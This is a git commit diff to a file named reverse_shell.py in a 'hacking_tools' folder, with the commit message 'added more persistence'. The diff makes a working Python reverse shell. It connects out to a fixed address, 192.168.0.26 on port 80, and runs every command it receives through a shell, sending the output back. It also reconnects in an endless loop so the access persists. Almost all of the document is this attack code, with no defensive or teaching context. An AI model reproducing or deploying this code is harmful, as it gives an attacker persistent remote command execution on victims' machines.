db572815e1072472386875764f3c3a78f881254f
horus <alfredoncdossantos@gmail.com>
2023-09-13 20:11:20 -0300

    added more persistence

--- python/hacking_tools/reverse_shell.py
+++ python/hacking_tools/reverse_shell.py
@@ -5,27 +5,50 @@ import socket
 from time import sleep
 
 
-def linux_exec(command):
+ip = "192.168.0.26"
+port = 80
+connected = False
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+def exec_command(command):
 	try:
 		proc = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE,  stdout=subprocess.PIPE, stdin=subprocess.PIPE)
 		result = proc.stdout.read() + proc.stderr.read()
 		return result
 	except Exception as error:
 		return error
-		
-		
-connected = False
 
-for i in range(3):
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect(('IP_address', 80))	# change this
-		connected = True
-		break
-	except:
-		sleep(20)
+
+def rce():
+	global connected
+	global s
+	
+	while True:
+		response = s.recv(1024)
 		
-while connected:
-	response = s.recv(1024)
-	command_result = linux_exec(response)
-	s.send(command_result)
+		if response == b'':
+			s.close()
+			connected = False
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			break
+			
+		command_result = exec_command(response)
+		s.send(command_result)
+
+
+def connect_back():
+	global connected
+
+	while True:
+		try:
+			if connected:
+				rce()
+			else:
+				s.connect((ip, port))	# change this
+				connected = True
+		except:
+			sleep(10)
+	
+	
+connect_back()
